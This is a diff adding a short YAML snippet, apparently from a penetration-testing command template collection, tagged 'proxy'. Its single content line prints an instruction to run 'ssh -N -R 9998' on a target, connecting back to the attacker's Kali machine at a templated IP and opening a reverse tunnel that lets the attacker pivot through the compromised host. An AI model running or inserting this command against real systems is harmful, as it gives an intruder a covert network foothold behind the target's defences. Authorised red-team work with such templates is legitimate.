@@ -1,0 +1,9 @@
+metadata:
+  filename: "ssh-remote-listener.yaml"
+  tags: ["proxy"]
+  created: "2025-03-29"
+  author: "@anakles"
+
+content: |
+  echo "On your target, enter: ssh -N -R 9998 kali@<%=${$(esh payloads/ip)}%>";
+
